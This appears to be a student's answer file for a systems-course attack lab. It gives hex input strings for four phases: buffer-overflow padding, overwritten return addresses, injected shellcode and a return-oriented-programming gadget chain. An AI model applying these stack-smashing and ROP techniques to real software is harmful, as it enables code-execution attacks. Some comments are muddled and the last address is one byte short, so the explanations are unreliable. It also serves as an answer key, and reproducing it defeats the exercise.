==================================================PHASE 1===============================================================
00 00 00 00 00 00 00 00	   /* 40 0's fill in stack with buffer limit */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00	

68 16 40 00 00 00 00 00	   /* address of touch1() in little-endian placed to overwrite getbuf()
			      returning address */
48 c7 c7 c6 e3 af 69 c3		/* mov rdi, cookie
				   This instruction overwrites ret to getbuf() which rets back to touch2() with rdi. */ 

================================================END PHASE 1=============================================================



==================================================PHASE 2===============================================================
00 00 00 00 00 00 00 00		/* padding to fill buffer */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00		
	
b8 22 66 55 00 00 00 00		/* getbuf is called to overwrite int val stored in rdi */

94 16 40 00 00 00 00 00 	/* overwriting ret address of getbuf() with touch2(int val) addr */
48 c7 c7 f0 22 66 55 c3		/* mov rdi, address of str before touch3 (0x556622f0) */

================================================END PHASE 2=============================================================



==================================================PHASE 3===============================================================
00 00 00 00 00 00 00 00		/* padding to fill in buffer */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00			

b8 22 66 55 00 00 00 00		/* address of getbuf, transfered from touch3()*/

68 17 40 00 00 00 00 00		/* address of touch3() */

36 39 61 66 65 33 63 36		/* since buffer is manipulated for args when calling touch3,
				   random() makes storing the cookieStr in the buffer impractical.
				   Instead, it overwrites the value of the exception handler.
				   The original goal was to place the string before touch3(), but
				   i guess overwriting it works better. */

================================================END PHASE 3============================================================



==================================================PHASE 4==============================================================
/* padding to fill stack with 40 bytes to fill buffer */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00

/* the gadget's address contained 58 c3 which will allow us
   to use pop rax. It overwrites the return addr of getbuf()
   to store the cookie into rax. The cookie is placed on the 
   stack before pop rax */
28 18 40 00 00 00 00 00

/* cookie in little endian */
c6 e3 af 69 00 00 00 00

/* this gadget's address allowed us to grab the hex values
   48 89 c7 c3 which gives us:  mov rdi, rax */
f8 17 40 00 00 00 00 00

/* touch2(int cookie) is called to take in rdi = cookie */
98 16 40 00 00 00 00

================================================END PHASE 4=============================================================
